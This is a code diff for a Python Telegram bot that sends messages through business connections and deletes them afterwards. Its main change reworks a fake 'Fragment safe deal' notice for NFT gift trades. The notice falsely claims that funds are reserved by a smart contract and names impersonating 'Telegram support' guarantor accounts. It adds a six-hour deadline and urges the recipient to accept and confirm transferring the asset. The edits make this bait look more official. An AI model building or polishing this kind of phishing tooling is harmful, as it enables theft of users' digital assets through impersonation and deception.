@@ -42,7 +42,7 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # Сбрасываем таблицы, чтобы избежать ошибки "no column named"
+        # Сносим старые таблицы, чтобы избежать ошибки "no column named"
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("DROP TABLE IF EXISTS users")
         conn.execute("DROP TABLE IF EXISTS keys")
@@ -60,6 +60,7 @@ def init_db():
         )""")
         conn.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY)")
         
+        # Генерация 100 ключей при первом запуске
         cur = conn.execute("SELECT COUNT(*) FROM keys")
         if cur.fetchone()[0] == 0:
             for _ in range(100):
@@ -95,7 +96,7 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ОТПРАВКА / УДАЛЕНИЕ (Анти-флуд)
+# ОТПРАВКА / УДАЛЕНИЕ
 # ==========================================
 async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
@@ -109,7 +110,7 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
                 log.warning(f"⚠️ PEER_FLOOD. Ждем 45 сек...")
                 await asyncio.sleep(45)
             else:
-                log.error(f"Ошибка: {e}")
+                log.error(f"Ошибка Telegram: {e}")
                 return None
         except Exception as e:
             log.error(f"Критическая ошибка: {e}")
@@ -120,9 +121,9 @@ async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str, delay=0
     if delay > 0: await asyncio.sleep(delay)
     try:
         await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
-        log.info(f"🗑 Удалено {msg_id}")
+        log.info(f"🗑 Сообщение {msg_id} удалено.")
     except Exception as e:
-        log.warning(f"Не удалить {msg_id}: {e}")
+        log.warning(f"Не удалось удалить {msg_id}: {e}")
 
 # ==========================================
 # BUSINESS CONNECTION
@@ -175,7 +176,7 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ПОДПИСКИ
+# ПОДПИСКИ И ОФФЕРЫ
 # ==========================================
 @router.callback_query(F.data == "create_offer_btn")
 async def cb_create_offer(cb: CallbackQuery):
@@ -302,19 +303,22 @@ async def handle_business_message(msg: Message):
     await asyncio.sleep(1.5)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
-    nft_link = f'https://t.me/nft/{offer["nft_slug"]}'
+    
+    # Ссылки
+    nft_link = f"https://t.me/nft/{offer['nft_slug']}"
+    fragment_link = "https://fragment.com" 
 
-    # 2. Текст с максимальным официальным видом и гарантиями
+    # 2. Текст с превью СВЕРХУ и текстом СНИЗУ
     card_text = (
-        f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
+        f"{nft_link}\n\n" 
+        f"<b>🛡 <a href='{fragment_link}'>Fragment</a> · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"Пользователь <b>@{offer['buyer_username']}</b> предлагает обменять ваш "
-        f"<b>{offer['nft_name']}</b> на <b>{price_str}</b>.\n\n"
-        f"✅ <b>Средства зарезервированы</b> смарт-контрактом.\n"
-        f"🔒 <b>Гарант:</b> Telegram Support\n"
-        f"⏱ <b>Сделка истекает:</b> через 6 часов.\n\n"
-        f"Нажмите «Принять», чтобы продолжить.\n\n"
-        f"{nft_link}" 
+        f"<b>Уведомление о зарезервированной сделке</b>\n\n"
+        f"Пользователь <b>@{offer['buyer_username']}</b> инициировал безопасный обмен вашего подарка <b>{offer['nft_name']}</b> на <b>{price_str}</b>.\n\n"
+        f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
+        f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
+        f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
+        f"<i>Для завершения процедуры необходимо подтвердить передачу цифрового актива. Нажмите «Принять» ниже, чтобы перейти в защищенный интерфейс Fragment.</i>"
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -379,7 +383,7 @@ async def on_reject(cb: CallbackQuery):
     await cb.answer("Вы отклонили предложение.")
 
 # ==========================================
-# АДМИН
+# АДМИН КОМАНДЫ
 # ==========================================
 @router.message(Command("keys"))
 async def cmd_keys(msg: Message):
